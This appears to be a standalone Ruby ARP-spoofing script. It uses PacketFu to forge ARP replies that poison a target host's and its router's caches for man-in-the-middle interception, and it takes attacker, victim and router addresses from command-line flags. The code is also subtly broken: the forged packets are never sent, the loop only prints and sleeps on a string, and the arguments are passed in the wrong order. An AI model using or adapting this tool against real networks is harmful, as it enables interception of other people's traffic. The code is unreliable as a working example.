require 'packetfu'
require 'optiflag'

module Inputs extend OptiFlagSet
    flag "atkmac" # attacking MAC
    flag "tgetIP" # arget IPADDR
    flag "tgetMAC" # targets MAC addr
    flag "tgRouter" # target router address
    flag "tgrmac" # targets router MAC Addr
    and_process!
end

flag1 = ARGV.flags.atkmac
flag2 = ARGV.flags.tgetIP
flag3 = ARGV.flags.tgetMAC
flag4 = ARGV.flags.tgRouter
flagt5 = ARGV.flags.tgrmac


module ARP_Spoofer 
    def ARP_Spoofer.ether_header(atkmac, vcmac, routeraddr, vcip, routermac, sleepmethod)
        ## packet for attacker
        puts "|Attacker MAC ADDR  | Target IPA    | Target MAC        | Modem MAC         |  Modem IP     |"
        #     |ff:ff:ff:ff:ff:ff  | 0.0.0.0.0     | ff:ff:ff:ff:ff:ff | ff:ff:ff:ff:ff:ff | 0.0.0.0       |
        puts "|-------------------|---------------|-------------------|-------------------|---------------|"
        puts "| #{atkmac} | #{vcip}   | #{vcmac}      | #{routermac} | #{routeraddr} |" 
        arp_packet_watchdog = PacketFu::ARPPacket.new
        arp_packet_watchdog.eth_saddr = "#{atkmac}"       
        arp_packet_watchdog.eth_daddr = "#{vcmac}"          
        arp_packet_watchdog.arp_saddr_mac = "#{atkmac}" 
        arp_packet_watchdog.arp_daddr_mac = "#{vcmac}"     
        arp_packet_watchdog.arp_saddr_ip = "#{routeraddr}"        
        arp_packet_watchdog.arp_daddr_ip = "#{vcip}"        
        arp_packet_watchdog.arp_opcode = 2                 
        router = PacketFu::ARPPacket.new
        router.eth_saddr = "#{atkmac}"    
        router.eth_daddr = "#{routermac}"       
        router.arp_saddr_mac = "#{atkmac}"
        router.arp_daddr_mac = "#{routermac}"      
        router.arp_saddr_ip = "#{vcip}"    
        router.arp_daddr_ip = "#{routeraddr}"        
        router.arp_opcode = 2    
        while true
            puts "|Attacker MAC ADDR  | Target IPA    | Target MAC        | Modem MAC         |  Modem IP     |"
            #     |ff:ff:ff:ff:ff:ff  | 0.0.0.0.0     | ff:ff:ff:ff:ff:ff | ff:ff:ff:ff:ff:ff | 0.0.0.0       |
            puts "|-------------------|---------------|-------------------|-------------------|---------------|"
            puts "| #{atkmac}         | #{vcip}       | #{vcmac}          | #{routermac}      | #{routeraddr} |" 
            sleep "#{sleepmethod}"
        end
    end
end

ARP_Spoofer.ether_header("#{flag1}", "#{flag2}", "#{flag3}", "#{flag4}", "#{flagt5}", 1)